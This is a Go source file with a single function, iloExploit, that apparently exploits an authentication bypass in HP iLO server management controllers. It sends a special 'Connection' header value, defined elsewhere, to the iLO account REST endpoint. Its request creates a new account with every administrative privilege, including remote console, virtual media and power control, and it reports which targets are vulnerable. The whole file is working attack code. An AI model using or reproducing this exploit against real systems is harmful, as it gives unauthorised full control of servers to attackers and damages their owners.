package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"gopkg.in/alecthomas/kingpin.v2"
)

func iloExploit(_ *kingpin.ParseContext) error {
	accounts := Accounts{
		Accounts: []Account{
			Account{},
		},
	}
	body := Account{
		UserName: user,
		Password: pw,
		Oem: Oem{
			Hp: Hp{
				LoginName: user,
				Privileges: Privileges{
					LoginPriv:                true,
					RemoteConsolePriv:        true,
					UserConfigPriv:           true,
					VirtualMediaPriv:         true,
					VirtualPowerAndResetPriv: true,
					ILOConfigPriv:            true,
				},
			},
		},
	}

	j, err := json.Marshal(body)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST",
		fmt.Sprintf("https://%s/rest/v1/AccountService/Accounts", addr),
		bytes.NewBuffer(j),
	)
	if err != nil {
		return err
	}

	req.Header.Add("Connection", magic)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Accept-Encoding", "gzip, deflate")

	response, err := client.Do(req)
	if err != nil {
		return err
	}

	if response.StatusCode == 401 {
		fmt.Printf("[+] %s is not vulnerable\n", addr)
		return nil
	} else if response.StatusCode != 201 {
		b, _ := ioutil.ReadAll(response.Body)
		fmt.Printf("[+] Error creating account on %s: %s\n", addr, b)
		return nil
	}

	fmt.Printf("[+] Printing account information:\n")
	b, _ := ioutil.ReadAll(response.Body)

	if err := json.Unmarshal(b, &accounts.Accounts[0]); err != nil {
		fmt.Print(err)
	}

	accounts.Print()

	return nil
}
